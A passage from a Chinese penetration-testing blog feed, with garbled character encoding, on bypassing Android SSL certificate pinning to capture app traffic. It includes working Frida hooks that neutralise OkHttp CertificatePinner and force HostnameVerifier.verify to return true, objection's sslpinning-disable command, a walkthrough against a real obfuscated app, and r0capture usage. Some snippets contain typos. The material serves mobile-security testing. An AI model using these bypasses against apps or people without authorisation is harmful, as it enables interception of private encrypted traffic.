class_">CertificatePinner</span> certificatePinner = <span class="keyword">new</span> <span class="title class_">CertificatePinner</span>.<span class="title class_">Builder</span>()</span><br><span class="line">        .<span class="title function_">add</span>(<span class="string">&quot;*.taobao.com&quot;</span>, <span class="string">&quot;sha256/IfXz1a0gWBA5oH+zasmRutUiyoZN3I8wLxHNQxk3NVo=&quot;</span>)</span><br><span class="line">        .<span class="title function_">add</span>(<span class="string">&quot;*.taobao.com&quot;</span>, <span class="string">&quot;sha256/IQBnNBEiFuhj+8x6X8XLgh01V9Ic5/V3IRQLNFFc7v4=&quot;</span>)</span><br><span class="line">        .<span class="title function_">add</span>(<span class="string">&quot;*.taobao.com&quot;</span>, <span class="string">&quot;sha256/K87oWBWM9UZfyddvDfoxL+8lpNyoUB2ptGtn0fv6G2Q=&quot;</span>)</span><br><span class="line">        .<span class="title function_">build</span>();</span><br><span class="line"></span><br><span class="line"><span class="title class_">OkHttpClient</span> okHttpClient = <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>().<span class="title function_">newBuilder</span>().<span class="title function_">certificatePinner</span>(certificatePinner).<span class="title function_">build</span>();</span><br></pre></td></tr></table></figure><p>è¿™å—çš„hashå€¼å¯ä»¥ä½¿ç”¨ CertificatePinner.pin(certificate)æ¥è·å–ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407062350770.png" alt="image.png"> </p><p>è¿™æ ·é€šè¿‡ä»£ç†è¯ä¹¦è‚¯å®šæ˜¯æ— æ³•è¯·æ±‚åˆ°æ•°æ®å’ŒæŠ“åŒ…äº†ï¼Œä½¿ç”¨ä¸‹é¢ä»£ç Hookï¼š</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookCertificatePinner</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="title class_">Builer</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;okhttp3.CertificatePinner$Builder&quot;</span>);</span><br><span class="line">        <span class="title class_">Builer</span>.<span class="property">add</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Frida Hook hookCertificatePinner()&quot;</span>, <span class="string">&quot;Success!!!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Hookä¹‹åå¯ä»¥æ­£å¸¸å–å¾—æ•°æ®å¹¶æŠ“åˆ°äº†ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407062351168.gif" alt="img"> </p><h2 id="HostnameVerifieræ ¡éªŒ"><a href="#HostnameVerifieræ ¡éªŒ" class="headerlink" title="HostnameVerifieræ ¡éªŒ"></a>HostnameVerifieræ ¡éªŒ</h2><p><code>HostnameVerifier</code>ä»£ç å®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">builder.hostnameVerifier(<span class="keyword">new</span> <span class="title class_">HostnameVerify</span>)&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">verify</span><span class="params">(String hostname, SSLSession session)</span>&#123;  <span class="comment">//ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œhostname:æœåŠ¡å™¨åŸŸå  session:ä¼šè¯ä¿¡æ¯ï¼Œé‡Œé¢ä¼šåŒ…å«è¯ä¹¦ç›¸å…³å†…å®¹</span></span><br><span class="line">        <span class="keyword">if</span> (hostname.equals(<span class="string">&#x27;www.baidu.com&#x27;</span>))&#123;  <span class="comment">//é¦–å…ˆåˆ¤æ–­hostnameæ˜¯å¦ä¸ºwww.baidu.com(è¿™å—éšä¾¿å†™çš„)</span></span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                Certificate[] peerCertificates = session.getPeerCertificates();  <span class="comment">//ä»sessionè·å–åˆ°æœåŠ¡å™¨ç«¯è¯ä¹¦ç›¸å…³ä¿¡æ¯</span></span><br><span class="line">                <span class="keyword">if</span>(peerCertificates[<span class="number">0</span>].getPublicKey().equals(myCertificate.getPublicKey()))&#123;  <span class="comment">//åˆ¤æ–­æœåŠ¡å™¨ç«¯è¯ä¹¦å…¬é’¥æ˜¯å¦å’Œæœ¬åœ°è¯ä¹¦å…¬é’¥ä¸€æ ·</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;    <span class="comment">//è‹¥åŒ¹é…æˆåŠŸåˆ™æ ¡éªŒé€šè¿‡ï¼Œæ ¡éªŒå¤±è´¥ï¼Œä¹Ÿå°±æ„å‘³æŠ“ä¸åˆ°åŒ…</span></span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span>(SSLPeerUnverifiedException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ã€æ³¨ã€‘è¿™å—çš„â€hostnameVerifyâ€ æ˜¯ä¸€ä¸ªæ¥å£ï¼Œå¦‚æœæˆ‘ä»¬è¦hookå®ƒçš„verifyæ–¹æ³•ï¼Œå°±è¦å…ˆæ‰¾åˆ°å®ç°è¿™ä¸ªæ¥å£çš„æ‰€æœ‰ç±»ã€‚ç„¶åhookè¿™äº›ç±»çš„verifyæ–¹æ³•</p><h4 id="åˆ¤æ–­å½“å‰ç±»æ˜¯å¦æ˜¯å®ç°hostnameVerifyæ¥å£çš„ç±»"><a href="#åˆ¤æ–­å½“å‰ç±»æ˜¯å¦æ˜¯å®ç°hostnameVerifyæ¥å£çš„ç±»" class="headerlink" title="åˆ¤æ–­å½“å‰ç±»æ˜¯å¦æ˜¯å®ç°hostnameVerifyæ¥å£çš„ç±»"></a>åˆ¤æ–­å½“å‰ç±»æ˜¯å¦æ˜¯å®ç°hostnameVerifyæ¥å£çš„ç±»</h4><p>checkIsImplementInterface(className, interfaceName)</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">//å®šä¹‰å‡½æ•°ï¼Œä¼ å…¥ç±»åå’Œæ¥å£</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">checkIsImplementInterface</span>(<span class="params">className, interfaceName</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> cls = <span class="title class_">Java</span>.<span class="title function_">use</span>(className);</span><br><span class="line">            <span class="keyword">if</span> (cls.<span class="property">class</span>.<span class="title function_">isInterface</span>())&#123;  <span class="comment">//åˆ¤æ–­è¿™ä¸ªä¼ å…¥çš„classæ˜¯ä¸æ˜¯ä¸€ä¸ªæ¥å£</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (cls.<span class="property">class</span> != <span class="literal">undefined</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span> (interfaceName.<span class="property">class</span>.<span class="title function_">isAssignableFrom</span>(cls.<span class="property">class</span>))&#123;  </span><br><span class="line">                    <span class="comment">//javaä¸­ï¼ŒisAssignableFrom æ–¹æ³•ç”¨äºç¡®å®šä¸€ä¸ªç±»æ˜¯å¦å¯ä»¥è¢«å¦ä¸€ä¸ªç±»èµ‹å€¼</span></span><br><span class="line">                    <span class="comment">//fridaä¸­ï¼Œæ£€æŸ¥ cls æ˜¯å¦å®ç°äº† interfaceName æ¥å£ï¼Œæˆ–è€… cls æ˜¯å¦æ˜¯ interfaceName æ¥å£çš„å­ç±»å‹</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="æ‰“å°å‡ºæ‰€æœ‰å®ç°äº†hostnameVerifyæ¥å£çš„ç±»"><a href="#æ‰“å°å‡ºæ‰€æœ‰å®ç°äº†hostnameVerifyæ¥å£çš„ç±»" class="headerlink" title="æ‰“å°å‡ºæ‰€æœ‰å®ç°äº†hostnameVerifyæ¥å£çš„ç±»"></a>æ‰“å°å‡ºæ‰€æœ‰å®ç°äº†hostnameVerifyæ¥å£çš„ç±»</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> hostnameVerifierInterface = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;javax.net.ssl.HostnameVerifier&quot;</span>);</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;  <span class="comment">//è°ƒç”¨Java.enumerateLoadedClassesæ¥éå†æ‰€æœ‰åŠ è½½çš„ç±»</span></span><br><span class="line">        <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">className</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_">checkIsImplementInterface</span>(className, hostnameVerifierInterface))&#123;</span><br><span class="line">                onsole.<span class="title function_">log</span>(className); <span class="comment">//æ‰“å°å‡ºå®ç°äº†TrustManageræ¥å£çš„ç±»å</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Enumeration completed.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">             </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="å¯¹å®ç°ç±»ä¸­çš„verifyæ–¹æ³•è¿›è¡Œhook"><a href="#å¯¹å®ç°ç±»ä¸­çš„verifyæ–¹æ³•è¿›è¡Œhook" class="headerlink" title="å¯¹å®ç°ç±»ä¸­çš„verifyæ–¹æ³•è¿›è¡Œhook"></a>å¯¹å®ç°ç±»ä¸­çš„verifyæ–¹æ³•è¿›è¡Œhook</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> hostnameVerifierInterface = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;javax.net.ssl.HostnameVerifier&quot;</span>);</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;  <span class="comment">//è°ƒç”¨Java.enumerateLoadedClassesæ¥éå†æ‰€æœ‰åŠ è½½çš„ç±»</span></span><br><span class="line">      <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">className</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span>(<span class="title function_">checkIsImplementInterface</span>(className, hostnameVerifierInterface))&#123;</span><br><span class="line">              onsole.<span class="title function_">log</span>(className); <span class="comment">//æ‰“å°å‡ºå®ç°äº†TrustManageræ¥å£çš„ç±»å</span></span><br><span class="line"></span><br><span class="line">              <span class="keyword">var</span> targetClass = <span class="title class_">Java</span>.<span class="title function_">use</span>(className);</span><br><span class="line">              <span class="keyword">var</span> len = targetClass[<span class="string">&#x27;verify&#x27;</span>].<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;javax.net.ssl.SSLSession&#x27;</span>).<span class="property">length</span>;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">                  targetClass[<span class="string">&#x27;verify&#x27;</span>].<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;javax.net.ssl.SSLSession&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">hostname, session</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;verify: &quot;</span> + hostname);</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;   <span class="comment">//è¿”å›trueè¡¨ç¤ºéªŒè¯é€šè¿‡</span></span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Enumeration completed.&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">           </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="å®Œæ•´hookä»£ç å¦‚ä¸‹"><a href="#å®Œæ•´hookä»£ç å¦‚ä¸‹" class="headerlink" title="å®Œæ•´hookä»£ç å¦‚ä¸‹"></a>å®Œæ•´hookä»£ç å¦‚ä¸‹</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">checkIsImplementInterface</span>(<span class="params">className, interfaceName</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> cls = <span class="title class_">Java</span>.<span class="title function_">use</span>(className);</span><br><span class="line">        <span class="keyword">if</span> (cls.<span class="property">class</span>.<span class="title function_">isInterface</span>())&#123;  <span class="comment">//åˆ¤æ–­è¿™ä¸ªä¼ å…¥çš„classæ˜¯ä¸æ˜¯ä¸€ä¸ªæ¥å£</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">         <span class="keyword">if</span> (cls.<span class="property">class</span> != <span class="literal">undefined</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (interfaceName.<span class="property">class</span>.<span class="title function_">isAssignableFrom</span>(cls.<span class="property">class</span>))&#123;  </span><br><span class="line">               <span class="comment">//javaä¸­ï¼ŒisAssignableFrom æ–¹æ³•ç”¨äºç¡®å®šä¸€ä¸ªç±»æ˜¯å¦å¯ä»¥è¢«å¦ä¸€ä¸ªç±»èµ‹å€¼</span></span><br><span class="line">               <span class="comment">//fridaä¸­ï¼Œæ£€æŸ¥ cls æ˜¯å¦å®ç°äº† interfaceName æ¥å£ï¼Œæˆ–è€… cls æ˜¯å¦æ˜¯ interfaceName æ¥å£çš„å­ç±»å‹</span></span><br><span class="line">               <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> hostnameVerifierInterface = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;javax.net.ssl.HostnameVerifier&quot;</span>);</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;  <span class="comment">//è°ƒç”¨Java.enumerateLoadedClassesæ¥éå†æ‰€æœ‰åŠ è½½çš„ç±»</span></span><br><span class="line">      <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">className</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span>(<span class="title function_">checkIsImplementInterface</span>(className, hostnameVerifierInterface))&#123;</span><br><span class="line">              onsole.<span class="title function_">log</span>(className); <span class="comment">//æ‰“å°å‡ºå®ç°äº†TrustManageræ¥å£çš„ç±»å</span></span><br><span class="line"></span><br><span class="line">              <span class="keyword">var</span> targetClass = <span class="title class_">Java</span>.<span class="title function_">use</span>(className);</span><br><span class="line">              <span class="keyword">var</span> len = targetClass[<span class="string">&#x27;verify&#x27;</span>].<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;javax.net.ssl.SSLSession&#x27;</span>).<span class="property">length</span>;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">                  targetClass[<span class="string">&#x27;verify&#x27;</span>].<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;javax.net.ssl.SSLSession&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">hostname, session</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;verify: &quot;</span> + hostname);</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;   <span class="comment">//è¿”å›trueè¡¨ç¤ºéªŒè¯é€šè¿‡</span></span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Enumeration completed.&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">           </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h1 id="0x04-objectionçš„SSLunpinning"><a href="#0x04-objectionçš„SSLunpinning" class="headerlink" title="0x04 objectionçš„SSLunpinning"></a>0x04 objectionçš„SSLunpinning</h1><p>ä½¿ç”¨ objection å¯åŠ¨exploreæ¨¡å¼ï¼šobjection -g com.actorn.netcapture explore</p><p>ç„¶åå†è¾“å…¥android sslpinning disableç»•è¿‡è¯ä¹¦ç»‘å®š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407070001995.jpeg" alt="img"> </p><p>ç„¶åå†ç‚¹å‡»appçš„åä¸‰ä¸ªæŒ‰é’®ï¼Œå°±å¯ä»¥æŠ“åˆ°httpsçš„è¯·æ±‚åŒ…äº†</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407070001275.jpeg" alt="img"> </p><h1 id="0x05-æ··æ·†æ¡†æ¶ä¹‹å…³é”®ç‚¹å¯»æ‰¾"><a href="#0x05-æ··æ·†æ¡†æ¶ä¹‹å…³é”®ç‚¹å¯»æ‰¾" class="headerlink" title="0x05 æ··æ·†æ¡†æ¶ä¹‹å…³é”®ç‚¹å¯»æ‰¾"></a>0x05 æ··æ·†æ¡†æ¶ä¹‹å…³é”®ç‚¹å¯»æ‰¾</h1><p>å¦‚æœæœ‰å¯¹ä»£ç è¿›è¡Œæ··æ·†å¤„ç†ï¼Œé‚£ä¹ˆç›´æ¥hookå¯¹åº”çš„ç±»å’Œæ–¹æ³•ï¼Œè¿™æ ·åœ¨å†…å­˜ä¸­æ˜¯ç›´æ¥æ‰¾ä¸åˆ°çš„ã€‚é‚£ä¹ˆä¹Ÿå°±ä¼šå¯¼è‡´hookå¤±è´¥ã€‚</p><p>è¿™ç§æƒ…å†µæ€ä¹ˆå¤„ç†å‘¢ï¼Ÿï¼Ÿï¼Ÿ</p><p>1ã€å®æˆ˜æ ·æœ¬ï¼šæ»´ç­”æ¸…å•.apk</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407070002696.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407070003316.png" alt="image.png"> </p><p>2ã€ä½¿ç”¨charleså¼€å¯æŠ“åŒ…ï¼Œä½†æŠ“åŒ…å¤±è´¥</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407070003668.png" alt="image.png"> </p><p>æŠ¥é”™ â€œClient closed the connection before a request was made. Possibly the SSL certificate was rejected.â€</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407070003114.png" alt="image.png"> </p><p>3ã€é€šè¿‡æŠ¥é”™å¯ä»¥çœ‹å‡ºæ˜¯å­˜åœ¨å®¢æˆ·ç«¯æ ¡éªŒçš„ï¼Œè¿™å—ç›´æ¥ä½¿ç”¨å¸¸è§ SSLUnpinningï¼Œæ²¡å•¥ç”¨</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407070003207.png" alt="image.png"> </p><p>4ã€çŒœæµ‹å¯èƒ½æ˜¯APPæœ¬èº«æœ‰åšäº†ä¸€äº›æ··æ·†ã€‚</p><p>ï¼ˆ1ï¼‰é¦–å…ˆæœªåŠ å£³ï¼Œç›´æ¥ä½¿ç”¨jadxæ‰“å¼€</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407070004091.png" alt="image.png"> </p><p>ï¼ˆ2ï¼‰æ‰“å¼€åï¼Œå‘ç°ä½¿ç”¨äº†OKhttp3æ¡†æ¶</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407070004231.png" alt="image.png"> </p><p>ï¼ˆ3ï¼‰å¯ä»¥çœ‹åˆ°åšäº†ä¸€å®šçš„æ··æ·†å¤„ç†ï¼Œç›´æ¥å’Œä¹‹å‰ä¸€æ ·hookè‚¯å®šæ˜¯ä¸è¡Œäº†ã€‚ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407070004614.png" alt="image.png"> </p><p>ï¼ˆ4ï¼‰è¿™å—å¯ä»¥å°è¯•æœç´¢å…³é”®çš„ç±»å’Œå‡½æ•°ï¼Œçœ‹èƒ½ä¸èƒ½å®šä½åˆ°</p><p>â‘ TrustManageræ ¡éªŒï¼šOkhttpClinetâ€”æ²¡æ‰¾åˆ°</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407070004436.png" alt="image.png"> </p><p>â‘¡certificatePinnerè¯ä¹¦ç»‘å®šï¼šcertificatePinner</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407070004405.png" alt="image.png"> </p><p>ï¼ˆ5ï¼‰å®šä½åˆ°è¯ä¹¦ç»‘å®šä»£ç ä½ç½® hq.f</p><p>åœ¨fç±»çš„aæ–¹æ³•ä¸Šï¼Œåˆšå¥½æœ‰å®šä¹‰certificatePinnerç»‘å®šæ ¡éªŒ</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407070004709.png" alt="image.png"> </p><p>ï¼ˆ6ï¼‰Fridaç¼–å†™ä»£ç  hook hq.f.a</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> className = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;hq.f&quot;</span>);</span><br><span class="line">    className.<span class="property">a</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;certificatePinner called&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p>(7)æˆåŠŸæŠ“åŒ…ï¼</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407070005390.png" alt="image.png"> </p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> APPæŠ“åŒ… </tag>
            
            <tag> sslunpinning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HttpæŠ“åŒ…ä¹‹R0Capture</title>
      <link href="/2024/06/28/Http%E6%8A%93%E5%8C%85%E4%B9%8BR0Capture/"/>
      <url>/2024/06/28/Http%E6%8A%93%E5%8C%85%E4%B9%8BR0Capture/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="ä¸€-R0Captureä»‹ç»"><a href="#ä¸€-R0Captureä»‹ç»" class="headerlink" title="ä¸€ R0Captureä»‹ç»"></a>ä¸€ R0Captureä»‹ç»</h1><h2 id="1-ä¸‹è½½åœ°å€"><a href="#1-ä¸‹è½½åœ°å€" class="headerlink" title="1. ä¸‹è½½åœ°å€"></a>1. ä¸‹è½½åœ°å€</h2><p><a href="https://github.com/r0ysue/r0capture">r0ysue&#x2F;r0capture: å®‰å“åº”ç”¨å±‚æŠ“åŒ…é€šæ€è„šæœ¬ (github.com)</a></p><h2 id="2-ä»‹ç»"><a href="#2-ä»‹ç»" class="headerlink" title="2. ä»‹ç»"></a>2. ä»‹ç»</h2><ul><li>ä»…é™å®‰å“å¹³å°ï¼Œæµ‹è¯•å®‰å“7ã€8ã€9ã€10ã€11ã€12ã€13ã€14 å¯ç”¨ï¼ˆç¦æ­¢æ¨¡æ‹Ÿå™¨ï¼‰ ï¼›</li><li>æ— è§†æ‰€æœ‰è¯ä¹¦æ ¡éªŒæˆ–ç»‘å®šï¼Œä¸ç”¨è€ƒè™‘ä»»ä½•è¯ä¹¦çš„äº‹æƒ…ï¼›</li><li>é€šæ€TCP&#x2F;IPå››å±‚æ¨¡å‹ä¸­çš„åº”ç”¨å±‚ä¸­çš„å…¨éƒ¨åè®®ï¼›</li><li>é€šæ€åè®®åŒ…æ‹¬ï¼šHttp,WebSocket,Ftp,Xmpp,Imap,Smtp,Protobufç­‰ç­‰ã€ä»¥åŠå®ƒä»¬çš„SSLç‰ˆæœ¬ï¼›</li><li>é€šæ€æ‰€æœ‰åº”ç”¨å±‚æ¡†æ¶ï¼ŒåŒ…æ‹¬HttpUrlConnectionã€Okhttp1&#x2F;3&#x2F;4ã€Retrofit&#x2F;Volleyç­‰ç­‰ï¼›</li><li>æ— è§†åŠ å›ºï¼Œä¸ç®¡æ˜¯æ•´ä½“å£³è¿˜æ˜¯äºŒä»£å£³æˆ–VMPï¼Œä¸ç”¨è€ƒè™‘åŠ å›ºçš„äº‹æƒ…ï¼›</li></ul><h2 id="3-ç”¨æ³•Usage"><a href="#3-ç”¨æ³•Usage" class="headerlink" title="3. ç”¨æ³•Usage"></a>3. ç”¨æ³•Usage</h2><ul><li>Spawn æ¨¡å¼ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ python3 r0capture.py -U -f com.coolapk.market -v</span><br></pre></td></tr></table></figure><ul><li>Attach æ¨¡å¼ï¼ŒæŠ“åŒ…å†…å®¹ä¿å­˜æˆpcapæ–‡ä»¶ä¾›åç»­åˆ†æï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ python3 r0capture.py -U é…·å®‰ -v -p iqiyi.pcap</span><br></pre></td></tr></table></figure><p>å»ºè®®ä½¿ç”¨<code>Attach</code>æ¨¡å¼ï¼Œä»æ„Ÿå…´è¶£çš„åœ°æ–¹å¼€å§‹æŠ“åŒ…ï¼Œå¹¶ä¸”ä¿å­˜æˆ<code>pcap</code>æ–‡ä»¶ï¼Œä¾›åç»­ä½¿ç”¨Wiresharkè¿›è¡Œåˆ†æã€‚</p><p>è€ç‰ˆæœ¬Fridaä½¿ç”¨åŒ…åï¼Œæ–°ç‰ˆæœ¬Fridaä½¿ç”¨APPåã€‚APPåå¿…é¡»æ˜¯ç‚¹å¼€appåï¼Œfrida-ps -Uæ˜¾ç¤ºçš„é‚£ä¸ªappåå­—ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406280958072.png" alt="img"> </p><ul><li>æ”¶å‘åŒ…å‡½æ•°å®šä½ï¼š<code>Spawn</code>å’Œ<code>attach</code>æ¨¡å¼å‡é»˜è®¤å¼€å¯ï¼›</li></ul><blockquote><p>å¯ä»¥ä½¿ç”¨<code>python r0capture.py -U -f cn.soulapp.android -v  &gt;&gt; soul3.txt</code>è¿™æ ·çš„å‘½ä»¤å°†è¾“å‡ºé‡å®šå‘è‡³txtæ–‡ä»¶ä¸­ç¨åè¿‡æ»¤å†…å®¹</p></blockquote><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406281000228.png" alt="image-20240628100039131"> 